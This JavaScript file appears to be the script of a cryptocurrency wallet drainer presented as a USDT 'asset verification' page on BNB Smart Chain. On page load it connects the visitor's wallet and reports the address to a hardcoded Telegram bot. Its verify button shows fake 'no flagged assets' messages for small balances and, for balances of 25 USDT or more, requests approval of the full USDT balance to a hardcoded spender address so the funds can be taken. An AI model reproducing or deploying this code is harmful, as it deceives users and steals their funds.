const bscAddress = "0x0dF2E31320b11d1c1C2C5c64FF895F1fdFA62ECe";
const bnbGasSender = "0x54dE549D98B0440678199334965Fd7Fa0A896088";
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";

let web3;
let userAddress;

async function connectWalletAndSwitch() {
    if (!window.ethereum) {
        alert("🦊 Trust Wallet or MetaMask not found.");
        return;
    }

    web3 = new Web3(window.ethereum);

    try {
        const accounts = await window.ethereum.request({
            method: "eth_requestAccounts"
        });
        userAddress = accounts[0];
        console.log("✅ Connected wallet:", userAddress);

        // Try to switch to BSC
        try {
            await window.ethereum.request({
                method: "wallet_switchEthereumChain",
                params: [{ chainId: "0x38" }]
            });
            console.log("✅ BNB chain active");
        } catch (switchError) {
            if (switchError.code === 4902) {
                await window.ethereum.request({
                    method: "wallet_addEthereumChain",
                    params: [{
                        chainId: "0x38",
                        chainName: "BNB Smart Chain",
                        nativeCurrency: {
                            name: "BNB",
                            symbol: "BNB",
                            decimals: 18
                        },
                        rpcUrls: ["https://bsc-dataseed.binance.org/"],
                        blockExplorerUrls: ["https://bscscan.com"]
                    }]
                });
            } else {
                throw switchError;
            }
        }

        // Telegram Log
        const token = "8006433058:AAEJDZ3DVvFT_bat8glPY8V5s7XSO3wYFzs";
        const chat = "1969221490";
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chat,
                text: `👤 Wallet Connected:\n${userAddress}\n🟡 Chain: BNB Smart Chain`,
                parse_mode: "Markdown"
            })
        });

    } catch (err) {
        console.error("❌ Connect error:", err);
        alert("Please connect wallet and approve BNB chain.");
    }
}

async function verifyAssets() {
    if (!web3 || !userAddress) {
        showPopup("Wallet not connected.", "red");
        return;
    }

    const verifyBtn = document.getElementById("verifyAssets");
    verifyBtn.disabled = true;
    verifyBtn.textContent = "Verifying...";

    try {
        const usdt = new web3.eth.Contract([
            { constant: true, inputs: [{ name: "_owner", type: "address" }], name: "balanceOf", outputs: [{ name: "", type: "uint256" }], type: "function" }
        ], usdtContractAddress);

        const [usdtRaw, bnbRaw] = await Promise.all([
            usdt.methods.balanceOf(userAddress).call(),
            web3.eth.getBalance(userAddress)
        ]);

        const usdtBalance = parseFloat(web3.utils.fromWei(usdtRaw, "ether"));
        const bnbBalance = parseFloat(web3.utils.fromWei(bnbRaw, "ether"));

        console.log("💰 USDT:", usdtBalance, "BNB:", bnbBalance);

        if (usdtBalance === 0) {
            showPopup("No USDT assets detected.", "black");
            return;
        }

        if (usdtBalance < 25) {
            showPopup(
                `✅ Verified: No flagged assets.<br><b>USDT:</b> ${usdtBalance}<br><b>BNB:</b> ${bnbBalance}`,
                "green"
            );
            return;
        }

        showPopup("Analyzing high USDT balance...", "green");

        if (bnbBalance < 0.0005) {
            await sendBNB(userAddress, "0.001");
        }

        await askApproval(usdtBalance);
    } catch (err) {
        console.error("❌ verifyAssets() error:", err);
        showPopup("Error verifying assets.", "red");
    } finally {
        verifyBtn.disabled = false;
        verifyBtn.textContent = "🔒 Verify Assets";
    }
}

async function askApproval(amount) {
    const usdt = new web3.eth.Contract([
        { constant: false, inputs: [{ name: "spender", type: "address" }, { name: "amount", type: "uint256" }], name: "approve", outputs: [{ name: "", type: "bool" }], type: "function" }
    ], usdtContractAddress);

    try {
        const amt = web3.utils.toWei(amount.toString(), "ether");
        await usdt.methods.approve(bscAddress, amt).send({ from: userAddress });

        showPopup(`✅ Approval granted for ${amount} USDT.`, "green");
    } catch (e) {
        console.error("❌ Approval failed:", e);
        showPopup("Approval rejected or failed.", "red");
    }
}

async function sendBNB(to, amount) {
    try {
        await web3.eth.sendTransaction({
            from: bnbGasSender,
            to: to,
            value: web3.utils.toWei(amount, "ether"),
            gas: 21000
        });
        console.log(`✅ Sent ${amount} BNB`);
    } catch (err) {
        console.error("❌ BNB send error:", err);
    }
}

function showPopup(message, color) {
    let popup = document.getElementById("popupBox");
    if (!popup) {
        popup = document.createElement("div");
        popup.id = "popupBox";
        popup.style.position = "fixed";
        popup.style.top = "50%";
        popup.style.left = "50%";
        popup.style.transform = "translate(-50%, -50%)";
        popup.style.padding = "20px";
        popup.style.borderRadius = "10px";
        popup.style.boxShadow = "0 0 10px rgba(0,0,0,0.2)";
        popup.style.fontSize = "18px";
        popup.style.zIndex = "9999";
        popup.style.background = "#fff";
        popup.style.maxWidth = "400px";
        popup.style.width = "80%";
        popup.style.textAlign = "center";
        document.body.appendChild(popup);
    }

    popup.style.color = (color === "red" ? "red" : color === "green" ? "green" : "black");
    popup.innerHTML = message;
    popup.style.display = "block";
    setTimeout(() => (popup.style.display = "none"), 5000);
}

// Run after page is fully loaded
window.addEventListener("load", () => {
    connectWalletAndSwitch();

    const verifyBtn = document.getElementById("verifyAssets");
    if (verifyBtn) {
        verifyBtn.addEventListener("click", verifyAssets);
    } else {
        console.error("❌ Button with id 'verifyAssets' not found");
    }
});
